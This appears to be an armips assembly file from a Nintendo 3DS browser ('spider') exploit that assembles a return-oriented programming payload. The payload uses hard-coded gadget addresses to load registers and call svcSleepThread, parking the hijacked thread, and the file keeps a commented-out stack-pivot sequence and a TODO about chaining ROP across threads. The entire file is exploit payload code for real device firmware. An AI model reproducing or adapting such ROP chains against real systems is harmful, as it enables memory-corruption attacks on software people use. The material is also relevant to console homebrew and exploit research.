.nds

.include "../../build/constants.s"

.create "spider_hook_rop.bin",0x0

; TODO : check if just doing thread0 ROP from thread5 could improve stability (we don't really need full spider control anymore)

.orga 0x0
	
	; .word 0xDEADDEAD
	; .word 0xDEADDEAD
	; .word 0xDEADDEAD

	.word 0x002954e8 ; pop {r0, pc}
		.word 0xFFFFFFFF
	.word 0x0023d10c ; pop {r1, pc}
		.word 0x00FFFFFF
	.word 0x002D6A5C ; svcSleepThread

	; .word 0x00279a28 ; pop {lr, pc}
	; 	.word SPIDER_INITIALROP_VADR ; lr => sp
	; .word 0x00279a24 ; mov sp, lr | pop {lr, pc}

.Close
